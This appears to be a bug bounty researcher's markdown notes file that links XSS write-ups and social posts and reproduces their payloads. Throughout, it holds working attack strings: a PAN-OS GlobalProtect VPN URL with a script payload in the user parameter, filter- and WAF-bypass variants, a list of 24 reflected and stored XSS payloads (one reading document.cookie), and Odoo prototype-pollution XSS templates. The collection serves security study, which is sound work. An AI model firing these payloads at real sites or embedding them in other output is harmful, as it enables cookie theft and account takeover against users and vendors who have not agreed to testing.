# xss writups

* [Account Takeover via Cleverly Placed XSS — Here’s How I Earned $$$](https://medium.com/legionhunters/no-password-no-problem-account-takeover-via-cleverly-placed-xss-heres-how-i-earned-33ac75c72cb4)

---
---

* [xss_reflected(linked_in_post)](https://www.linkedin.com/posts/amitkumar711_tips-xss-crosssitescripting-activity-7337706340758261760-9itk/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

 ![image](https://github.com/user-attachments/assets/bf9a13e8-bc24-49f3-a1d7-bcdca799a675)



 ---
 ---

* [XSS in Hidden Input Without User Interaction](https://medium.com/@mhmodgm54/xss-in-hidden-input-without-user-interaction-acbd530c89b6)

---
---

* [post_link](https://www.linkedin.com/posts/engr-shahid-hussain-81b262230_xss-panos-cybersecurity-activity-7341777728611758080-v-CP/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

```url
https://domain[.]com/ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer
```

<img width="701" height="755" alt="image" src="https://github.com/user-attachments/assets/abe3f98e-e13c-44f3-aefe-74a4fc1a2920" />


---
---


* ## ``It’s my old Triple XSS Bug Bounty Write-up``

[writeup](https://wadgamaraldeen.medium.com/how-i-found-3-xss-types-reflected-blind-stored-dom-xss-in-one-program-and-got-c3a30a32adf7)

---
---



* ## ``Same payload, 3 different browsers``

[post_link](https://www.linkedin.com/posts/deepak-saini-cyber_chrome-edge-firefox-activity-7349077676642455554--s05/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

```
%3cimg%2fsrc%2fonerror%3dalert%2f%2f%26NewLine%3b(2)%3e
```
```
<img/src/onerror=alert//&(NewLine);(2)>
```

<img width="562" height="740" alt="image" src="https://github.com/user-attachments/assets/f099187a-c447-4189-9ab6-d1da9bc60a81" />


---
---


* ## ``When I Bypassed Google CAPTCHA: The Epic Exploit of POST-based XSS + CSRF``

[writeup_link](https://infosecwriteups.com/when-i-bypassed-google-captcha-the-epic-exploit-of-post-based-xss-csrf-1fb66f7cf886)


----
----


<details>
   <summary>XSS payloads</summary>


XSS PAYLOADS 🔐

Basic XSS Payloads (Reflected & Stored)

1. "><script>alert(1)</script>  
2. <img src=x onerror=alert(1)>  
3. <svg/onload=alert(1)>  
4. <script>confirm(document.domain)</script>  
5. <body onload=alert('XSS')>  

Filter Bypass Payloads

6. "><scr<script>ipt>alert(1)</scr<script>ipt>  
7. <iframe src="javascript:alert(1)"></iframe>  
8. <math href="javascript:alert(1)">CLICK</math>  
9. <a href="javas&#99;ript:alert(1)">Click</a>  
10. <input autofocus onfocus=alert(1)>  

Advanced and Efficient Payloads

11. <img src="x" onerror=alert(document.cookie)>  
12. <details open ontoggle=alert(1)>  
13. <video><source onerror="alert(1)">  
14. <svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>  
15. <marquee onstart=alert(1)>XSS</marquee>  
16. <form><button formaction="javascript:alert(1)">CLICK</button></form>  
17. <link rel="stylesheet" href="javascript:alert(1)">  
18. <meta http-equiv="refresh" content="0;url=javascript:alert(1)">

JS Context Payloads

19. ';alert(1);//  
20. ";alert(1);//  
21. </script><script>alert(1)</script>  
22. javascript:alert(1)

Attribute Injection Payloads

23. <button onclick=alert(1)>Click</button>
24. <a onmouseover=alert(1)>Hover me</a>

 
</details>


----
----



[linkedin_post](https://www.linkedin.com/posts/adi-tiansyah-72847b327_bughunter-activity-7352684216226070528-qm5W/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)


**`payloads`**

```html

"<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"
<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
```

------
-------

[linked_in_post](https://www.linkedin.com/posts/hossam-shady-123330193_bugbountytips-bugbountytip-redteam-activity-7362423675360292865-YIPJ/?utm_source=share&utm_medium=member_desktop&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)


<details>


```
weird WAF bypass.

xyztest");alert(origin);// => 403
xyz,test");alert(origin);// => 200
credit:- https://lnkd.in/dixt4-NG
```

    
</details>


---
---



[post_link](https://www.linkedin.com/posts/1337rokudenashi_reflected-xss-in-odoo-apps-via-prototype-ugcPost-7364609257385693184-ile3/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

<details>


Reflected XSS in Odoo Apps via Prototype Pollution (jQuery BBQ < 1.3.1)

Odoo apps (<= 15.0) using jQuery BBQ < 1.3.1 are vulnerable to prototype pollution via $.deparam(), allowing DOM-based reflected XSS.

```html

 - "{{BaseURL}}?__proto__%5Bcontext%5D=%3Cimg%2Fsrc%2Fonerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x"

 - "{{BaseURL}}?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x"

```

 
</details>
































